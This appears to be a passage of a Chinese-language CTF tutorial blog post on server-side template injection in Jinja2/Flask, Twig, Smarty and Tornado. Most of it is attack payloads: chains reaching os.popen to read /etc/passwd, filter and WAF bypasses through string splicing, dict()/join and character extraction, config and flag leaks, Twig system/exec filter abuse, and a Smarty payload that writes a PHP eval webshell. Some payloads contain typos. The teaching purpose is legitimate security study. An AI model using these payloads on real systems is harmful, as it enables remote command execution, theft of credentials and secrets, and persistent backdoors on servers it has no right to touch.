+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&#x27;__class__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__base__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&#x27;__init__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><p>过滤了”class” “arg“ “from” “value” “int” “globals”等关键字</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-14.png"></p>
+<hr>
+<h3 id="“-”拼接"><a href="#“-”拼接" class="headerlink" title="“+”拼接"></a>“+”拼接</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span>&#125;&#125;		-&gt;		&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span>&#125;&#125;		<br><br>先构造完整payload<br>&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__base__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(<span class="hljs-number">199</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__inti&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(&#x27;os&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(&#x27;cat /etc/passwd&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>()&#125;&#125;<br><br>用+拼接<br>&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__ba&#x27;</span>+<span class="hljs-string">&#x27;se__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subcl&#x27;</span>+<span class="hljs-string">&#x27;asses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(<span class="hljs-number">199</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__in&#x27;</span>+<span class="hljs-string">&#x27;ti&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__gl&#x27;</span>+<span class="hljs-string">&#x27;obals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(&#x27;os&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;po&#x27;</span>+<span class="hljs-string">&#x27;pen&#x27;</span>]</span>(&#x27;cat /etc/passwd&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="jinjia2中的”-”拼接"><a href="#jinjia2中的”-”拼接" class="headerlink" title="jinjia2中的”~”拼接"></a>jinjia2中的”~”拼接</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;&#123;()[<span class="hljs-string">&#x27;__class__&#x27;</span>]&#125;&#125;			--&gt;	 &#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__cla&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;()[a~b]&#125;&#125;<br><br>先构造完整payload<br>&#123;&#123;()[<span class="hljs-string">&#x27;__class__&#x27;</span>][<span class="hljs-string">&#x27;__base__&#x27;</span>][<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]()[<span class="hljs-string">&#x27;__getitem__&#x27;</span>](199)[<span class="hljs-string">&#x27;__inti&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__getitem__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>)[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br><br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__cla&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;__ba&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;se__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">e</span>=<span class="hljs-string">&#x27;__subcl&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">f</span>=<span class="hljs-string">&#x27;assess__&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">g</span>=<span class="hljs-string">&#x27;__in&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">h</span>=<span class="hljs-string">&#x27;it___&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">i</span>=<span class="hljs-string">&#x27;__gl&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">j</span>=<span class="hljs-string">&#x27;olbals&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">k</span>=<span class="hljs-string">&#x27;po&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">l</span>=<span class="hljs-string">&#x27;pen&#x27;</span>%&#125;&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[a~b][c~d][e~f]()[199][g~h][i~j][<span class="hljs-string">&#x27;os&#x27;</span>][k~l](<span class="hljs-string">&#x27;cat /etc/passwd&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="过滤器-1"><a href="#过滤器-1" class="headerlink" title="过滤器"></a>过滤器</h3><p><strong>过滤器reverse</strong></p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-15.png"></p>
+<p><strong>过滤器replace和过滤器join</strong></p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-16.png"></p>
+<h3 id="利用python的char"><a href="#利用python的char" class="headerlink" title="利用python的char()"></a>利用python的char()</h3><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-17.png"></p>
+<hr>
+<h2 id="Length过滤器绕过数字过滤"><a href="#Length过滤器绕过数字过滤" class="headerlink" title="Length过滤器绕过数字过滤"></a>Length过滤器绕过数字过滤</h2><p>通过length去计算字符串长度从而得到整数数字</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">		#10</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">		#30</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaaaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>-<span class="hljs-string">&#x27;aaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">10a*12个a-3个a=117个a				#117</span><br><span class="language-xml">也可以用+</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>绕过数字过滤</strong></p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-18.png"></p>
+<hr>
+<h2 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a><strong>config</strong></h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>flag可能隐藏在config文件内</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-19.png"></p>
+<h3 id="current-app"><a href="#current-app" class="headerlink" title="current_app"></a>current_app</h3><p>如果无法直接调用config</p>
+<p>调用current_app相当与调用flask</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h2><h3 id="dict-和join"><a href="#dict-和join" class="headerlink" title="dict()和join"></a>dict()和join</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">dict()	</span><span class="hljs-comment"># 用来创建一个字典</span><br><span class="hljs-keyword">join:	</span><span class="hljs-comment"># 将一个序列中的参数值拼接成字符串</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(benbean=<span class="hljs-number">1</span>)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">	创建字典a,键名benben，键值1	</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__cla=<span class="hljs-number">1</span>,ss=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml">	创建字典a，join把参数值拼接成字符串</span><br></code></pre></td></tr></table></figure>
+
+<p>在无法使用引号的情况下，可使用dict()生成字典，配合join或者键名生成字符串</p>
+<p>值不影响，拼接的只是键名</p>
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=dict(__cla=<span class="hljs-number">1</span>,ss=<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;a&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">使用join拼接出字符串&quot;__class__&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="获取符号"><a href="#获取符号" class="headerlink" title="获取符号"></a>获取符号</h3><p>利用flask内置函数和对象获取符号</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben= (&#123;&#125;|select()|string()) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#获取下划线</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben = (self|string()) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#获取空格</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben = (self|string|<span class="hljs-name">urlencode</span>) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#获取百分号</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> ben = (app.__doc__|string) %&#125;</span><span class="hljs-template-variable">&#123;&#123;ben&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-20.png"></p>
+<hr>
+<h3 id="实例解析1"><a href="#实例解析1" class="headerlink" title="实例解析1"></a>实例解析1</h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">**用</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> kg=&#123;&#125;<span class="hljs-punctuation">|</span>select()<span class="hljs-punctuation">|</span>string()<span class="hljs-punctuation">|</span>attr(d)(<span class="hljs-number">10</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml">得到空格**</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-21.png"></p>
+<hr>
+<h3 id="实例解析2（WAF过滤’’’，’”‘，’-’，’-’，’-‘，’-’，’-‘）"><a href="#实例解析2（WAF过滤’’’，’”‘，’-’，’-’，’-‘，’-’，’-‘）" class="headerlink" title="实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）"></a>实例解析2（WAF过滤’’’，’”‘，’_’，’.’，’[‘，’]’，’ ‘）</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">使用</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|string|list&#125;&#125;</span><span class="language-xml">获取符号</span><br></code></pre></td></tr></table></figure>
+
+<p>第9位是空格，第18位是下划线</p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> nine=dict(aaaaaaaaa=a)|<span class="hljs-name">join</span>|count %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name">set</span> eighteen=nine+nine %&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;nine,eighteen&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>9个a统计数量得到数字9<br>计算得到数字18，注意这里不能用length，因为单双引号被过滤了</p>
+<hr>
+<p>获取下划线</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-22.png"></p>
+<hr>
+<p><strong>全流程</strong></p>
+<p>得到下划线和空格</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-23.png"></p>
+<p>得到__globals__</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-24.png"></p>
+<p>得到__getitem__</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-25.png"></p>
+<p>得到’os’</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-26.png"></p>
+<p>得到’cat flag’</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-27.png"></p>
+<p>最后得到read</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-28.png"></p>
+<p>最终payload：</p>
+<p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-29.png"></p>
+<hr>
+<h1 id="其他模版"><a href="#其他模版" class="headerlink" title="其他模版"></a>其他模版</h1><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><p>文章 - Twig 模板注入从零到一 - 先知社区</p>
+<p>Twig 1.x</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看id</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><span class="language-xml">//查看flag</span><br></code></pre></td></tr></table></figure>
+
+<p>Twig 2.x,3.x</p>
+<p>到了 Twig 2.x &#x2F; 3.x 版本中，__self 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。</p>
+<p>在 Twig 3.x 中，map 这个过滤器可以允许用户传递一个箭头函数，并将这个箭头函数应用于序列或映射的元素：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用sort过滤器</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用fitter过滤器</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;passthru&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用reduce过滤器</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;passthru&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;exec&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流<br><br><br>&#123;self::getStreamVariable(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br><br>写入webshell<br><br><br>&#123;Smarty_Internal_Write_File::writeFile(<span class="hljs-variable">$SCRIPT_NAME</span>,<span class="hljs-string">&quot;&lt;?php eval(<span class="hljs-variable">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,self::clearConfig())&#125;<br><br>&#123;<span class="hljs-variable">$smarty</span>.version&#125;  <span class="hljs-comment">#获取smarty的版本号</span><br>&#123;php&#125;phpinfo();&#123;/php&#125;  <span class="hljs-comment">#执行相应的php代码</span><br><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;   <br>&#123;<span class="hljs-keyword">if</span> phpinfo()&#125;&#123;/if&#125;<br><br>查看目录<br>&#123;<span class="hljs-keyword">if</span> system(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;&#123;/if&#125;<br><br>读取文件<br>&#123;<span class="hljs-keyword">if</span> readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>)&#125;&#123;/if&#125;<br>&#123;<span class="hljs-keyword">if</span> system(<span class="hljs-string">&#x27;tac /flag&#x27;</span>)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/123329244">tornado模版注入全解</a></p>
+<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量。<br>简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
